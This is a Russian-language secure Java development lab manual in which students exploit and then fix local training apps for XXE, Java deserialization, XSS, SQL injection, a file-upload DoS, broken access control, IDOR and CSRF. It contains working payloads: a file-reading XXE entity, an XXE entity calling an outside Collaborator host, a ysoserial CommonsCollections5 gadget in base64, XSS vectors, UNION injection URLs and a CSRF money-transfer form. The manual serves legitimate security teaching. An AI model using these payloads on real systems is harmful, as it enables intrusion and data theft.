# Лабораторный практикум "Безопасная разработка ПО: Прикладной курс Java"

## Содержание
1. [Настройка окружения](#environment)
2. [Обработка XML](#xxe)
3. [Сериализация и десерилизация данных](#deserialization)
4. [Вывод информации пользователю](#xss)
6. [Работа с СУБД](#sqli)
7. [Использование небезопасных компонентов](#known_vuln)
8. [Реализация механизмов контроля доступа](#mfac)
9. [Реализация механизмов контроля доступа (Небезопасные прямые ссылки на объекты)](#idor)
10. [Обработка запросов на изменение данных (защита от CSRF)](#csrf)
11. [Небезопасные настройки компонентов](#misconfig)

## <a name="environment"></a>Настройка окружения
### Настройка Burp Suite и Firefox
1. Установить Firefox\* (<https://www.mozilla.org/ru/firefox/>)
2. Скачать Burp Suite\*\* Community Edition __JAR__ file
(<https://portswigger.net/burp/communitydownload>) | 
[Прямая ссылка](https://portswigger.net/burp/releases/download?product=community&type=jar)
3. Запустить Burp Suite
 (<https://support.portswigger.net/customer/portal/articles/1783038-Installing_Launching%20Burp.html>)
4. Сконфигурировать Firefox для работы с Burp Suite
(<https://support.portswigger.net/customer/portal/articles/1783055-Installing_Configuring%20your%20Browser.html>)
5. Уберите _localhost_ и _127.0.0.1_ из списка адресов, на которые браузер
заходит без прокси
   
   Начиная с версии Firefox 67.0 необходимо дополнительно выставить параметр network.proxy.allow_hijacking_localhost в true, для этого нужно:   
   1. Перейти на страницу `about:config`;
   2. Нажать кнопку "Принять риск и продолжить";
   3. Найти параметр `network.proxy.allow_hijacking_localhost`;
   4. Нажать кнопку "Переключить".

6. Отключите перехват исходяших HTTP-запросов в Burp Suite (по умолчанию после запуска всегда включён): Вкладка _Proxy -> Intercept -> Intercepter is on_ , нажать для отключения

\* - Браузер Firefox необходим в данном курсе т.к. в нём отсутствует встроенная защита от XSS,
 следовательно есть возможность наглядно и без лишних усложнений продемонстрировать выполнение
  JavaScript-кода в контексте браузера. Также Firefox не использует системные настройки прокси,
   что позволяет направить через прокси только необходимый нам трафик веб-приложения,
    а не всей операционной системы. 

\*\* - В данном курсе инструмент Burp Suite используется как MITM (Man-In-The-Middle) HTTP-Proxy
 с возможностью отправлять вручную сформированные HTTP-пакеты.
Более подробно ознакомиться с возможностями Burp Suite вы можете в документации на официальном сайте:
 <https://portswigger.net/burp/documentation/contents>

#### Опциональные настройки

Для удобства можно отключить сервис Captive portal в Fierefox, который генерирует запросы к [http://detectportal.firefox.com/success.txt](http://detectportal.firefox.com/success.txt).

  1. перейти на страницу `about:config`;
  2. нажать кнопку "Принять риск и продолжить";
  3. При помощи стоки поиска найти параметр `network.captive-portal-service.enabled`;
  4. Нажать кнопку "Переключить";


### Настройка IntelliJ IDEA
1. Скачать и установить IntelliJ IDEA Community Edition
(https://www.jetbrains.com/idea/download/)
2. Открыть в IntelliJ IDEA папку с проектом training_java_security_deep_dive

## <a name="xxe"></a>Задание №1. Обработка XML
### Описание
Одной из наиболее распространенных атак на приложения, обрабатывающие XML,
является внедрение внешних XML сущностей (XML eXternal Entity - XXE).
Эта атака возникает при обработке плохо сконфигурированными парсерами
XML-документов, содержащих ссылки на внешние сущности.
### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-xxe_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Посмотрите пример счёта (bill_example.xml). _Какую структуру счёта ожидает
приложение?_
4. Загрузите счёт в приложение через форму (http://localhost:8091/bill).
_Как происходит обработка счёта?_
5. Запустите Unit-тесты. Проанализируйте результаты их выполнения.

#### Часть 2. Внедрение внешних сущностей XML
1. _Что такое DTD (Document Type Definition)?
Как можно определить DTD внутри XML-документа?_
2. Определите XML-сущность в документе счёта. Загрузите сформированный
счёт в приложение. _Что произошло?_
```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe "XXE Vulnerability Test"> ]>
<bill>
    <product id="28">
        <name>&xxe;</name>
        <quantity>1</quantity>
        <price>1337</price>
    </product>
</bill>
```
3. _Что такое внешние XML-сущности (eXternal XML Entities)?_
4. Создайте файл C:\\TEMP\\secret.txt. Запишите в этот файл какую-нибудь фразу, чтобы в дальнейшем убедиться, что
он прочитан. Определите внешнюю XML-сущность в
документе так, чтобы можно было прочитать этот файл. Загрузите сформированный
счёт в приложение. _Что произошло?_
```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE product [ <!ELEMENT product ANY >
    <!ENTITY xxe SYSTEM "file:////C:\\TEMP\\secret.txt"> ]>
<bill>
    <product id="28">
      <name>&xxe;</name>
      <quantity>77</quantity>
      <price>31337</price>
    </product>
</bill>
```
5. _Какие возможности это открывает перед атакующим?_

#### Часть 3. Предотвращение уязвимостей XXE
1. Откройте _BillPrintingController_. Найдите участок кода, отвечающий за
обработку счетов. _Как происходит обработка XML в приложении?_
2. Отключите поддержку DTD (и, соответсвенно, поддержку внешних сущностей).
```Java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
3. Загрузите в приложение счёт с XXE. _Что произошло?_
4. Запустите Unit-тесты. Проанализируйте результаты их выполнения. Проверьте,
что счета без внешних сущностей обрабатываются корректно.

### Дополнительные задания
#### Часть 4. Расширенная эксплуатация XXE
1. Верните поддержку DTD в приложении.
2. Определите внешнюю сущность так, чтобы можно было обратиться к внутреннему
серверу.  _Что произошло?_
```XML
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE product [ <!ELEMENT product ANY >
    <!ENTITY xxe SYSTEM "http://gyiv38a8htdpb0m9zfr7w95tkkqaez.burpcollaborator.net"> ]>
<bill>
    <product id="28">
      <name>&xxe;</name>
      <quantity>77</quantity>
      <price>31337</price>
    </product>
</bill>
```
3. _Какие возможности это открывает перед атакующим?_

## <a name="deserialization"></a>Задание №2. Сериализация и десерилизация данных
### Описание

__Избегайте десериализации данных, полученных из недоверенных источников.__

Если такой подход невозможен, следующие меры позволят снизить риск:

* Обеспечьте строго ограничение типа во время десериализации до создания
объекта (см. Java Jackson);
* Внедрите проверку целостности (с использованием закрытого ключа) или шифрование сериализованных объектов для предотвращения атак, связанных с созданием
подложным объектов или изменением данных;
* Изолируйте код, выполняющий десериализацию, и запускайте его в окружении с
минимальными привилегиями;
* Выполняйте логирование и мониторинг всех исключений и ошибок, связанных с
десериализацией.

### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-deserialization_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Перейдите по ссылке _[set your name](http://localhost:8091/hello?name=test)_.
И установите себе имя.
4. Перейдите по ссылке _look at yourself_. _Что передается в
параметрах?_

#### Часть 2. Небезопасное использование нативной Java десериализации
1. Посмотрите код HelloController. _В каком формате генерируется параметр
session?_
2. Скопируйте значение параметра __session__ во вкладку __Decoder__(в Burp Suite). Настройте
декодирование (Decode as __URL__ -> Decode as __Base64__).
3. Скопируйте декодированное значение в первое окно ввода. Настройте кодирование
(Encode as __Base64__ -> Encode as __URL__).
4. Измените имя с _test_ на _vuln_. Скопируйте закодированное значение и
добавьте в URL вместо оригинального параметра. _Что произошло?_
5. Скачайте генератор payload'ов для эксплуатации небезопасной Java Native
десериализации [ysoserial раздел Installation](https://github.com/frohoff/ysoserial#installation).
__ПРЕДУПРЕЖДЕНИЕ: Возможно срабатывание антивирусных средств на данный payload__
6. Сгенерируйте payload для запуска калькулятора через гаджет CommonCollections5
```
java -jar ysoserial-master.jar CommonsCollections5 calc.exe > payload.bin
```
7. Вставьте сгенерированный payload в Burp Suite (Вкладка Repeater -> ПКМ (правая кнопка мыши) ->
  Paste From File)
8. Закодируйте payload (Выделите всё -> ПКМ -> Send to Decoder ->
  Encode as __Base64__)
9. Отправьте в Repeater запрос к ois (Вкладка Proxy -> подвкладка HTTP history -> выбрать соответсвующий
  запрос -> ПКМ -> Send to Repeater)
10. Замените значение параметра session на закодированный payload. Примените к
вставленному значению URL encode (ПКМ -> Convert selections -> URL ->
  URL-encode key characters)
  ```
  rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAU3QAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAANXEAfgANcQB%2bAA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB%2bAAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB%2bAAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2bADJzcQB%2bACt1cQB%2bAC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB%2bADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AMgAAAAFxAH4AN3NxAH4AJ3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eA%3d%3d
  ```
11. Отправьте запрос, посмотрите логи приложения. _Что произошло?_

#### Часть 3. Безопасное использование JSON десериализации
1. Для JSON-сериализации воспользуемся библиотекой Jackson:
```Java
import com.fasterxml.jackson.databind.ObjectMapper;
```
2. Измените тип сериализации параметра session на JSON (метод hello):
```Java
ObjectMapper mapper = new ObjectMapper();
byte[] jsonBytes = mapper.writeValueAsBytes(webUser);
String webUserOISB64 = Base64.getEncoder().encodeToString(jsonBytes);
```
3. Изменим тип десериализации параметра session (метод ois).
```Java
byte[] byteSession = Base64.getDecoder().decode(session);
ObjectMapper mapper = new ObjectMapper();
User webUser = mapper.readValue(byteSession, User.class);
```
4. Проверьте работоспособность приложения

## <a name="xss"></a>Задание №3. Вывод информации пользователю
### Описание
Рекомендуемым способом защиты от XSS-атак является:

1. Осуществлять канонизацию/нормализацию данных (java.text.Normalizer.normalize()) до их валидации
2. Осуществлять проверку передаваемых данных на соответствие белому списку допустимых значений (проверка значения по регулярному выражению) с учетом ограничений допустимой длины значения передаваемого параметра
3. В случае необходимости сохранения спец. символов - осуществлять экранирование потенциально опасных символов (например, при передаче данных для формирования сценариев – например, JavaScript, формировании значений атрибутов HTML тэгов и иных ситуаций, в которых кодирование спец. символов может нарушить логику работы приложения). Рекомендуется выполнять экранирование в качестве дополнительной меры защиты даже в тех случаях, когда осуществляется проверка данных по белому списку.
4. Кодировать данные, используемые для формирования любого элемента HTML страницы
5. Использовать дополнительные меры защиты от атак, описанные ниже
6. В случае отсутствия необходимости сохранения спец. символов в передаваемых данных (если данные не используются непосредственно для формирования HTML кода разметки или сценариев) рекомендуется осуществлять кодирование потенциально опасных символов

### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-xss_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Попробуйте добавить пост с текстом: "This is <b\>test</b\> post."
_Как отображается пост в списке?_

#### Часть 2. Выполнение произвольного javascript-кода
1. Заполните имя, как:
```HTML
<script>alert('xss in name')</script>
```
2. Заполните текст, как:
```HTML
<img src=x onerror="alert('xss in post')"/>
```
3. Отправьте пост. _Что произошло?_
4. Посмотрите исходный код страницы. _Как выводится имя автора и текст поста на странице?_

#### Часть 3. Кодирование вывода в thymeleaf шаблонах
1. Откройте файл resources/templates/posts_list.html.
 _Как выводится имя автора комментария?_
2. Измените вывод
```HTML
<p><i>Posted by <span th:text="${post.author}">Author</span></i></p>
```
3. Пересоберите проект. Заполните имя, как:
```HTML
<script>alert('xss in name')</script>
```
4. Отправьте пост. Посмотрите исходный код страницы. _Как выводится имя автора на странице?_

#### Часть 4. Санитайзинг html
1. Подключите библиотеку [OWASP Java HTML Sanitizer](https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project) в pom.xml
```XML
<dependency>
        <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
        <artifactId>owasp-java-html-sanitizer</artifactId>
        <version>20180219.1</version>
</dependency>
```
2. Откройте edu/otib/lab_xss/entity/Post.java. Найдите метод получение текста.
3. Добавьте импорт классов PolicyFactory и Sanitizers
```java
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;
```
4. Добавьте код, санитизирующий текст поста и разрешающий использование тегов
форматирования (<b\>, <i\> и т.д.), картинок (<img\>) и ссылок (<a\>):
```java
PolicyFactory sanitizer = Sanitizers.FORMATTING.and(Sanitizers.LINKS).and(Sanitizers.IMAGES);
return sanitizer.sanitize(text);
```
5. Пересоберите проект. Заполните текст поста, как:
```HTML
<img src=x onerror="alert('1 xss in post')"/>
<script>alert('2 xss in post');</script>
<a href="javascript:alert('3 xss in post')">CLICK ME </a>
<a href="http://localhost:8091/">TEST SIMPLE LINK</a>
<b>TEST BOLD</b>
```
6. Отправьте пост. Посмотрите исходный код страницы. _Как выводится текст поста на странице?_

## <a name="sqli"></a>Задание №4. Работа с СУБД
### Описание
Наиболее распространённым способом компрометации СУБД является атака SQL-Injection, суть которой состоит в том, что атакующий имеет возможность видоизменять тело SQL запроса и влиять на логику его работы с дальнейшим получением/изменением данных находящихся в СУБД.

### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-sqli_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Перейдите на страницу новости. _Как формируется URL?_

#### Часть 2. Чтение данных с помощью SQL-инъекции
1. Добавьте в URL __AND 1=1__. _Как изменился SQL-запрос к БД?_
```
http://localhost:8091/1 AND 1=1
http://localhost:8091/1%20AND%201=1
```
2. Добавьте в URL __AND 1=2__. _Что произошло?_
```
http://localhost:8091/1 AND 1=2
http://localhost:8091/1%20AND%201=2
```
3. С использованием SQL-инъекции извлеките данные из другой таблицы:
```
http://localhost:8091/-1 UNION SELECT 1,id,val from secret
http://localhost:8091/-1%20UNION%20SELECT%201,id,val%20from%20secret
```

#### Часть 3. Безопасная работа с базой данных
1. Откроем файл dao/ArticleDAO.java. _Найдите места в коде, где происходит
выполнение SQL-запросов. Как подставляются параметры в SQL-запрос?_
2. Изменим строку SQL-запрос с использованием параметров (символ '?').
```Java
final static String SQL_GET_ARTICLE_BY_ID = "SELECT id, title, text FROM article WHERE id = ?";
```
3. Исправим SQL-запрос с конкатенацией параметров на параметризированный запрос:
```Java
Article article = jdbcTemplate.queryForObject(SQL_GET_ARTICLE_BY_ID, new Object[] { id }, rowMapper);
```
4. Проверьте работоспособность приложения.
5. Попробуйте отправить в приложение вектор с SQL-инъекцией. _Что произошло?_


## <a name="known_vuln"></a>Задание №5. Использование небезопасных компонентов
### Описание
Использование известных уязвимостей в сторонних компонентах позволяет без особых усилий и максимально быстро получить результат в целевой атаке.
В случае нецелевых атак, данный вектор атаки позволяет автоматизированно атаковать множество хостов.

### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-known_vulns_
2. Запустите проект. Зайдите на http://localhost:8091/
3. _Какой функционал предоставляет сервис? Какой сервер приложений используется?_

#### Часть 2. Определение небезопасного функционала и эксплуатация уязвимости
1. Используйте https://www.cvedetails.com для поиска уязвимостей в данной версии сервера приложений. Найдите наиболее критичную уязвимость(используйте CVSS рейтинг). _Есть ли описанный функционал в данном сервисе?_
2. Изучите патч, который был создан для фикса данной уязвимости. Для поиска используйте Google, идентификатор уязвимости и название небезопасного компонента. _Какой длины должен быть boundary для эксплуатации данной уязвимости?_
3. Проведите загрузку файла через сервис. Убедитесь, что запросы выполняется. Изучите его в Burp.
4. Перешлите запрос в Repeater. Попробуйте изменить boundary? _Что происходит если длина boundary >= 4094 символов?_
5. _Как можно использовать данную узявимость?_

#### Часть 3. Исправление небезопасного функционала без смены версии компонента
1. Откройте файл controller/FileController.java. _Найдите место в коде, где используется MultipartStream. Каким образом создается объект данного класса? В каком месте запрос зависает?_
2. Изучите альтернативные конструкторы MultipartStream. Исправим уязвимость путем использования конструктора с явным указанием размера буфера:
```Java
MultipartStream multipartStream = new MultipartStream(request.getInputStream(), boundary.getBytes(), boundary.length() * 2);
```
3. Проверьте работоспособность приложения.
4. Попробуйте зааплоадить файл с длиной boundary >= 4094 символов. _Проявляется ли уязвимость?_

#### Часть 4. Исправление небезопасного функционала путем обновления версии
1. Уберите изменения произведенные в часте 3.
2. Откройте файл pom.xml. _Найдите строку, где импортируется небезопасный компонент. В какой версии компонента была исправлена дання уязвимость?_
3. Замените версию небезопасного компонента.
4. Проверьте работоспособность приложения.
5. Попробуйте зааплоадить файл с длиной boundary >= 4094 символов. _Проявляется ли уязвимость?_

## <a name="mfac"></a>Задание №6. Реализация механизмов контроля доступа
### Описание
Управление доступом необходимо для того, чтобы только авторизованные пользователи выполняли разрешенные им операции и получали доступ к разрешенным ресурсам. Это позволяет предотвратить несанкционированный доступ к информации. Следовательно, в системе должны быть механизмы, осуществляющие управление доступом.

### Подробное руководство
#### Часть 1. Подготовка
1. Откройте проект _lab-broken-access-control_
2. Запустите проект. Зайдите на http://localhost:8091/
3. Перейдите на страницу http://localhost:8091/hello.  _Что произошло?_
4. Залогитесь под пользователем _user_ с паролем _password_
5. Перейдите на страницу http://localhost:8091/hello

#### Часть 2. Получение доступа
1. Завершите сессию пользователя в приложении.
2. Откройте файл _MvcConfig.java_. _Какие точки входа есть в приложение?_
3. Откройте файл _WebSecurityConfig.java_. _Как ограничен доступ к различным точкам входа?_
4. Перейдите на страницу http://localhost:8091/secret.  _Что произошло?_

#### Часть 3. Запрет доступа по-умолчанию
1. Запретите доступ по-умолчанию для всех точек входа в приложение, не указанных явно:
```java
http
      .authorizeRequests()
            .antMatchers("/", "/home").permitAll()
            .antMatchers("/hello").hasRole("USER")
            .anyRequest().denyAll()
            .and()
      .formLogin()
            .loginPage("/login")
            .permitAll()
            .and()
      .logout()
            .permitAll();
```
2. Перезапустите приложение. Перейдите на страницу http://localhost:8091/secret.  _Что произошло?_
3. Разрешите пользователям с ролью _USER_. Доступ к _/secret_.
4. Перезапустите приложение. Проверьте корректность работы приложения

## <a name="idor"></a>Задание №7. Реализация механизмов контроля доступа (Небезопасные прямые ссылки на объекты)
### Описание
Insecure Direct Object Reference (небезопасная прямая ссылка на объект) - уязвимость, которая возникает тогда, когда приложение позволяет напрямую обращаться к объекту.

### Основная часть
#### Частья 1. Подготовка
1. Откройте модуль _lab-idor_
2. Запустите модуль. Зайдите на http://localhost:8091/
3. Залогиньтесь под пользователем _user1_ с паролем _password1_. _Данные о каких платежах доступны пользователю?_
4. Залогиньтесь под пользователем _user2_ с паролем _password2_. _Данные о каких платежах доступны пользователю?_

#### Часть 2. Получение доступа по прямой ссылке
1. Залогиньтесь под пользователем _user1_. Перейдите по ссылке на детальную информацию о платеже с _ID=1_. _Как передаётся информация о ID приложению?_
2. Измените значение ID в URL. _Что произошло?_ _Как злоумышленник может проэксплуатировать подобную уязвимость?_

#### Часть 3. Реализация механизма контроля доступа при обращении по прямой ссылке
1. Откройте файл _WebSecurityConfig.java_. _Как настроен механизм контроля доступа?_
2. Включите поддержку авторизации на методах и классах. Для этого добавьте аннотацию
_EnableGlobalMethodSecurity_ на класс _WebSecurityConfig_:
```java
@EnableGlobalMethodSecurity(prePostEnabled = true)
```
3. Добавьте проверку доступа для метода _getPaymentById_ из класса _PaymentService_, так чтобы проверялось соответствие имени владельца платежа и авторизированного пользователя:
```java
@PostAuthorize("returnObject.user == authentication.name")
```
4. Запустите приложение. Попробуйте получить доступ к информации о платежах других пользователей.

### Дополнительное задание
1. Определите авторизацию для метода getPaymentsByUser. Проверьте работу приложения.

## <a name="csrf"></a>Задание №8. Обработка запросов на изменение данных (защита от CSRF)
### Описание
CSRF (Сross Site Request Forgery) -  вид атак на посетителей веб-сайтов, использующий недостатки протокола HTTP. Если жертва заходит на сайт, созданный злоумышленником, от её лица тайно отправляется запрос на другой сервер (например, на сервер платёжной системы), осуществляющий некую вредоносную операцию (например, перевод денег на счёт злоумышленника). Для осуществления данной атаки жертва должна быть аутентифицирована на том сервере, на который отправляется запрос, и этот запрос не должен требовать какого-либо подтверждения со стороны пользователя, которое не может быть проигнорировано или подделано атакующим скриптом.

### Основная часть
#### Часть 1. Подготовка
1. Откройте модуль _lab-csrf_
2. Запустите модуль. Зайдите на http://localhost:8091/
3. Залогиньтесь под пользователем _user_ с паролем _password_ по ссылке http://localhost:8091/login
4. Перейдите на страницу http://localhost:8091/transfer. Переведите 20 рублей
пользователю Test. _Посмотрите какие запросы отправляет браузер на сервер_

#### Часть 2. Межстайтовая подделка запросов
1. Зайдите в Burp вкладка _Proxy -> HTTP History_ и найдите там POST-запрос на
перевод денег.
2. Создайте html-страницу, которая отправляет форму для перевода _31337_
на аккаунт _HACKER_:
```html
<html>
  <body>
    <form action="http://localhost:8091/transfer" method="POST">
      <input type="hidden" name="to" value="HACKER" />
      <input type="hidden" name="amount" value="31337" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
3. Измените поле _to_ на _HACKER_, а поле _amount_ на _31337_
4. Протестируйте полученную форму в браузере, предварительно залогинившись
в приложении (http://localhost:8091/login). _Как может злоумышленник
проэксплуатировать подобную уязвимость?_

#### Часть 3. Защита от CSRF-атак
1. Откройте файл _WebSecurityConfig.java_. _Как реализован метод configure?_
2. Удалите строку:
```java
http.csrf().disable();
```
3. Откройте файл _transfer__form.html_. Добавьте antiCSRF-токен на форму:
```html
<input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
```
4. Пересоберите приложение. Проверьте его работоспособность. _При каких условия
теперь возможна CSRF-атака?_

## <a name="misconfig"></a>Задание №7. Небезопасные настройки компонентов
### Описание
Современные приложения состоят из множества компонентов и работают на разных уровнях модели OSI. Защита приложения осуществляется как в собственном коду, так и в настройке окружения(компонентов). Некорректная настройка компонентов может привести к полной компрометации приложения и обрабатываемых данных.

### Основная часть
#### Часть 1. Подготовка
1. Откройте модуль _lab-misconfiguration_
2. Запустите модуль. Зайдите на http://localhost:8091/
3. Изучите функционал страницы. Произведите подсчет заработной платы. _Посмотрите какие заголовки приходят от сервера?_